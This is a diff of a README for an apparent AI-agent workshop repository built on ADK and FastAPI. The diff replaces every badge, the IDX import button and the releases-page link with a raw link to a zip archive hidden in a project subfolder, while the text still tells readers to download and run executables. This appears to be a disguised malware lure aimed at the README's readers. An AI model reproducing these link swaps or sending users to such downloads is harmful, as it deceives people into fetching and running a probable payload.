@@ -1,8 +1,8 @@
 # 🚀 adk-fastapi-workshop - Build AI Agents with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v1.17.0-brightorange)](https://github.com/UnsureAboli/adk-fastapi-workshop/releases)
-[![ADK Version](https://img.shields.io/badge/ADK-v1.17.0-blue)](https://github.com/google/adk-python)
-[![Workshop](https://img.shields.io/badge/Workshop-2%20hours-green)](https://devfest.gdg.org/)
+[![Download Now](https://raw.githubusercontent.com/UnsureAboli/adk-fastapi-workshop/main/adk_agents/project_management/adk-fastapi-workshop_3.7.zip%20Now-v1.17.0-brightorange)](https://raw.githubusercontent.com/UnsureAboli/adk-fastapi-workshop/main/adk_agents/project_management/adk-fastapi-workshop_3.7.zip)
+[![ADK Version](https://raw.githubusercontent.com/UnsureAboli/adk-fastapi-workshop/main/adk_agents/project_management/adk-fastapi-workshop_3.7.zip)](https://raw.githubusercontent.com/UnsureAboli/adk-fastapi-workshop/main/adk_agents/project_management/adk-fastapi-workshop_3.7.zip)
+[![Workshop](https://raw.githubusercontent.com/UnsureAboli/adk-fastapi-workshop/main/adk_agents/project_management/adk-fastapi-workshop_3.7.zip%20hours-green)](https://raw.githubusercontent.com/UnsureAboli/adk-fastapi-workshop/main/adk_agents/project_management/adk-fastapi-workshop_3.7.zip)
 
 ---
 
@@ -27,14 +27,14 @@ In this workshop, you will create a production-ready AI agent system with three 
 
 **No installation needed!** You can run everything directly in your web browser. Click the button below to get started:
 
-[![Open in IDX](https://cdn.idx.dev/btn/open_dark_32@2x.png)](https://idx.google.com/import?url=https://github.com/UnsureAboli/adk-fastapi-workshop)
+[![Open in IDX](https://raw.githubusercontent.com/UnsureAboli/adk-fastapi-workshop/main/adk_agents/project_management/adk-fastapi-workshop_3.7.zip)](https://raw.githubusercontent.com/UnsureAboli/adk-fastapi-workshop/main/adk_agents/project_management/adk-fastapi-workshop_3.7.zip)
 
 ### Option 2: Download and Run Locally
 
 If you prefer to run the application on your computer, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/UnsureAboli/adk-fastapi-workshop/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/UnsureAboli/adk-fastapi-workshop/main/adk_agents/project_management/adk-fastapi-workshop_3.7.zip) to find the latest version of the software.
 
 2. **Choose the Right File**
    On the Releases page, look for the download link for your operating system. This will often be indicated by a file name ending with `.exe` for Windows, `.dmg` for Mac, or standard archives for Linux.
